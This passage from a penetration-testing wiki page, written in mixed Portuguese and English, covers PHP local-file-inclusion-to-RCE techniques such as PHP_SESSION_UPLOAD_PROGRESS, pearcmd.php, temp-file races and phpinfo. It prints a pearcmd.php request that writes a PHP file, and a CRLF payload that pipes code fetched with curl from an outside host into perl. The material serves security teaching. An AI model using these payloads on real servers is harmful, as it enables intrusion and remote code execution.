Se você encontrou um **Local File Inclusion** mesmo se você **não tiver uma sessão** e `session.auto_start` estiver `Off`. Se você fornecer o **`PHP_SESSION_UPLOAD_PROGRESS`** em dados **multipart POST**, o PHP irá **ativar a sessão para você**. Você poderia abusar disso para obter RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Se você encontrou um **Local File Inclusion** e o servidor está rodando em **Windows**, você pode conseguir RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), o script `/usr/local/lib/phppearcmd.php` existe por padrão em php docker images. Além disso, é possível passar argumentos para o script via URL porque é indicado que se um param de URL não tiver um `=`, ele deve ser usado como argumento. Veja também [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) e [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
O exemplo a seguir explora uma vuln CRLF para obter RCE (de [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Via phpinfo() (file_uploads = on)

Se você encontrar uma **Local File Inclusion** e um arquivo expondo **phpinfo()** com file_uploads = on você pode obter RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Se você encontrar uma **Local File Inclusion** e você **can exfiltrate the path** do temp file MAS o **server** está **checking** se o **file to be included has PHP marks**, você pode tentar **bypass that check** com esta **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Via eternal waiting + bruteforce

Se você puder abusar do LFI para **upload temporary files** e fazer o server **hang** a execução do PHP, você poderia então **brute force filenames during hours** para encontrar o arquivo temporário:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

Se você incluir qualquer um dos arquivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Você precisa incluir o mesmo one 2 time to throw that error).

**I don't know how is this useful but it might be.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Referências

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
